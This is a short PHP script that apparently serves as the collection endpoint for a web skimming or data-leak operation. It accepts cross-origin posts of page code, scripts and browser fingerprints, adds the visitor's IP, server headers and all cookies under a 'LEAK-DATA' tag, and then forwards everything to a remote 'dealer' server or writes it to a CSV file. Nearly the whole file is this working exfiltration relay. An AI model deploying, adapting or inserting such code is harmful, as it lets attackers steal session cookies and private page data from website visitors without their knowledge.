<?php 
    header("Access-Control-Allow-Origin: *");   
    $DEALER_NAME="PHP.DEALER"; //DEALER_NAME
    $URI_REZ="http://192.168.1.74/dealer"; //DEALER URL DEAFULT: http://localhost:8888/

    function getUserIP() {
        $ip = null;

        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $ip = trim($ipList[0]); 
        } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
            $ip = $_SERVER['HTTP_X_REAL_IP'];
        } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
    
        return $ip;
    }
    
    // Uso
    $IP = getUserIP();
    $MODE = "SENDER"; // SENDER | WRITER      
    $user_agent=$_SERVER['HTTP_USER_AGENT'];
    $UA = str_replace('"', '', $user_agent);
    //$UA=$_REQUEST['ua'];
    
    // Obtener los parámetros del request
    $fpUser = isset($_POST['u']) ? $_POST['u'] : '';
    $fpBrowser = isset($_POST['b']) ? $_POST['b'] : '';
    $fpRequest = isset($_POST['r']) ? $_POST['r'] : '';
    $jsData = isset($_POST['data']) ? $_POST['data'] : '';
    $encodedPage = isset($_POST['code']) ? $_POST['code'] : '';
    $encodedScr = isset($_POST['s']) ? $_POST['s'] : '';
    // Initialize $datetime
    $datetime = new DateTime(); // Create a DateTime object with the current time
    $TS = $datetime->format('Y-m-d\TH:i:s.v\Z'); // Format as ISO 8601 with milliseconds


    $encoded_data=$_SERVER;
    $encoded_req=json_encode($_REQUEST);

    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No referer';
    $origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : 'No origin';


    // Obtener las cookies
    $cookies = [];
    foreach ($_COOKIE as $name => $value) {
        $cookies[$name] = $value;
    }


    // Obtener la información de cabeceras y la request, y codificarla en base64
    $requestData = [
        'headers' => $encoded_data,
        'dealer_uri' => $origin,
        'merca_uri' => $referer,
        'cookies' => $cookies,
        'leak' => "LEAK-DATA",
        'requestURL' => $_SERVER['REQUEST_URI'],
        'method' => $_SERVER['REQUEST_METHOD']
    ];
    $requestData = json_encode($requestData);

    $data = [
        "DEALER_NAME" => $DEALER_NAME,
        "ip" => $IP,
        "UA" => urlencode($UA),
        "u" => $fpUser,
        "b" => $fpBrowser,
        "ts" => $TS,
        "r" => $fpRequest,
        "code" => $encodedPage,
        "s" => $encodedScr,
        "data" => $jsData,
        "encoded_req" => $requestData
    ];

    if ($MODE == "SENDER") {
            $options = array(
                'http' => array(
                    'header'  => "Origin: 5ELG-".$DEALER_NAME."\r\nReferer: ".$DEALER_NAME."\r\nUser-Agent: ".$UA."\r\nContent-type: application/x-www-form-urlencoded\r\n",
                    'method'  => 'POST',
                    'content' => http_build_query($data)
                )
            );
            echo http_build_query($data);
            $context  = stream_context_create($options);
            $result = file_get_contents($URI_REZ, false, $context);
            if ($result === FALSE) { echo $result; }

    } else {           
            $file = fopen($PATH_WRITER, "a");
            fputcsv($file, $data);
            fclose($file);
    }
?>